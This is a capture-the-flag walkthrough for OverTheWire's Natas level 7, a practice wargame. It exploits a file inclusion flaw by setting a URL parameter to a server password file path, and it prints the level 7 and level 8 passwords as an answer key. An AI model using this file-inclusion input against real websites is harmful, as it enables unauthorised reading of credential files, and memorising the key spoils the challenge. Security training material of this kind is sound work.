# Natas CTF Solutions  

## Natas Level 7  

### 🌐 **Challenge Description**  
Natas teaches the basics of server-side web security. Each level consists of a website located at:  
👉 `http://natasX.natas.labs.overthewire.org` (where **X** is the level number).  

---

### 🎯 **Goal**  
- Exploit the **file inclusion vulnerability** to read a restricted file.  
- Retrieve the password for the next level.  

---

## 🚀 **Solution**  

### **Step 1: Open the URL**  
Visit:  
```  
http://natas7.natas.labs.overthewire.org  
```  

---

### **Step 2: Enter Login Credentials**  
- **Username:** `natas7`  
- **Password:** Use the password from Natas Level 6:  
```
bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
```  
![Home Page](https://github.com/user-attachments/assets/d0cd25eb-508c-42c5-9012-33cf8e989246)

---

### **Step 3: Analyze the Webpage**  
- The page contains **clickable links** that navigate between pages like "Home" and "About".  
- The **URL changes dynamically** when switching pages:  
  ```
  http://natas7.natas.labs.overthewire.org/index.php?page=home
  ```  
- Inspecting the page source reveals a **hint** that passwords are stored in:  
  ```
  /etc/natas_webpass/natas8
  ```  

![Page Source](https://github.com/user-attachments/assets/0dde0931-6930-4e9f-8067-37c79c9ed50a)

---

### **Step 4: Exploit File Inclusion**  
Since the `page` parameter loads different pages dynamically, let's try replacing `home` with the **absolute path** of the password file:  

```  
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```  

---

### **Step 5: Retrieve the Password**  
- After modifying the URL, the page displays the password for **Natas Level 8**.  

---

### **✅ Password for Natas Level 8**  
```
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
```  

---

## 💡 **Lessons Learned**  
✔️ **File Inclusion Vulnerability**: When user input is used in `include()` or `require()` functions, it can be exploited to load sensitive files.  
✔️ **Path Traversal**: If the server doesn't properly validate input, attackers can read arbitrary files by specifying absolute paths.  
✔️ **Inspect Page Source for Hints**: Comments or hints in the HTML source can reveal important clues.  

---

## 🖼️ **Screenshots**  
| Step | Screenshot |  
|------|------------|  
| Step 3 – Page Source with Hint | ![Page Source](https://github.com/user-attachments/assets/0dde0931-6930-4e9f-8067-37c79c9ed50a)|  
| Step 5 – Page after Exploitation | ![Password](https://github.com/user-attachments/assets/2dad61ac-4466-4a6d-b808-426553f3244e) |  

---

## 🎯 **Next Level**  
Use the password to access **Natas Level 8**:  
👉 [http://natas8.natas.labs.overthewire.org](http://natas8.natas.labs.overthewire.org)  

---
